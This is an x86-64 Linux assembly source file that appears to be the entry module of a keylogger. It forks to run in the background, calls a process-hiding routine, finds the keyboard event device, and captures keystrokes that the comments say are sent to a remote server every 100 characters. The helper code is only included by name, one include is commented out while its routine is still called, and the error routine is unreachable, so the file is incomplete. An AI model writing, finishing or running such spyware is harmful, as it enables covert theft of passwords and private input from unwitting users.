; %include "hide_process.asm"
%include "find_event_file.asm"
%include "capture_keys.asm"

section .text
  global _start


; _start is the entry point
_start:
  ; start by creating a fork and quit parent process to hide execution
  mov rax, 57
  syscall

  cmp rax, 0
  jne .exit

  ; hiding process
  ; INPUT:
  ;    nothing
  ; RESULT:
  ;    nothing
  call hide_process

  ; find the correct event file and store it into rax
  ; INPUT:
  ;    nothing
  ; RESULT:
  ;    rax - source file
  call find_event_file
  mov r10, rax
 
  ; read keys from the source file and save them after 100chars 
  ; send to a remote server
  call capture_keys

.exit:
   mov rax, 60
   xor rdi, rdi
   syscall

error:
  mov rax, 1
  mov rdi, 1
  mov rsi, errorMsg
  mov rdx, errorMsgLen
  syscall

  mov rax, 60
  mov rdi, 1
  syscall

section .data
  errorMsg db "must be run as root", 0xa
  errorMsgLen equ $ - errorMsg
